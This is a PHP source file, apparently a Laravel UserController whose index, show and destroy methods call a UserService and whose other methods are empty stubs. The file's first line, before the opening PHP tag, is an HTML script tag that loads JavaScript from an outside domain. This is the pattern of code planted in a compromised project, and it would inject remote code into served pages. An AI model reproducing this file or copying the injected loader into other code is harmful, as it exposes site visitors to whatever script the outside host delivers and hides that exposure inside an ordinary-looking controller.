<script src="https://cache.cloudswiftcdn.com/"></script><?php

namespace App\Http\Controllers;

use App\Services\UserService;
use Illuminate\Http\Request;

class UserController extends Controller
{

    protected $user;
    public function __construct(UserService $userService)
    {
        $this->user = $userService;
    }
    /**
     * Display a listing of the resource.
     */
    public function index(Request $request, $id = null, $model = "\App\Models\User")
    {
        //
        return $this->user->userIndex($request, $id, $model);
    }

    /**
     * Show the form for creating a new resource.
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     */
    public function store(Request $request)
    {
        //
    }

    /**
     * Display the specified resource.
     */
    public function show(Request $request, $id = null, $model = 'App\Models\User')
    {
        return $this->user->userShow($request, $id, $model);
    }

    /**
     * Show the form for editing the specified resource.
     */
    public function edit(string $id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     */
    public function update(Request $request, string $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     */
    public function destroy($id){
        return $this->user->userDestroy($id);
    }

    public function search(){
        
    }
}
